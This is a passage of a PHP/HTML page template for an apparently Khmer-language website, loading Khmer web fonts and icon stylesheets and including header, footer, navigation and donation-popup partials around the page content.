  <link href="https://fonts.googleapis.com/css2?family=Moulpali&family=Siemreap&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Siemreap&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Koulen&display=swap" rel="stylesheet">
  <style>
    .koulen {
      font-family: 'Koulen', 'Alegreya Sans', sans-serif !important;
    }

    .btb {
      font-family: 'Battambang', 'Alegreya Sans', sans-serif !important;
    }

    .sr {
      font-family: 'KhmerOSSiemreap', 'Roboto', sans-serifx !important;
    }
  </style>

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Khmer" media="all">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">


</head>

<body
  class="home page-template-default page page-id-6574 global-block-template-8 tdb-template tdc-header-template tdc-footer-template td-animation-stack-type1 td-full-layout td-js-loaded"
  itemscope="itemscope" itemtype="https://schema.org/WebPage">


  <?php
  include_once 'layouts/mobile_nav.php';
  ?>
  <!-- Header -->
  <div id="td-outer-wrap" class="td-theme-wrap">

    <?php
    include_once 'layouts/header_frontend.php';
    ?>


    <div class="td-main-content-wrap td-main-page-wrap td-container-wrap">
      <div class="tdc-content-wrap">
        <div id="tdi_32" class="tdc-zone">
          <!-- <div class="tdc_zone tdi_33  wpb_row td-pb-row"> -->
          <?php echo $content; ?>
          <!-- </div> -->
        </div>
      </div>
      <div class="td-container">
        <div class="td-pb-row">
          <div class="td-pb-span12">
            <div class="comments" id="comments">
            </div> <!-- /.content -->
          </div>
        </div>
      </div>
    </div>


    <?php
    include_once 'layouts/footer_frontend.php';
    ?>


  </div><!--close td-outer-wrap-->
  <?php
  // popup_donet
  include_once 'components/popup_donet.php';
  // script
  include_once 'components/script.php';
  ?>





</body>

</html>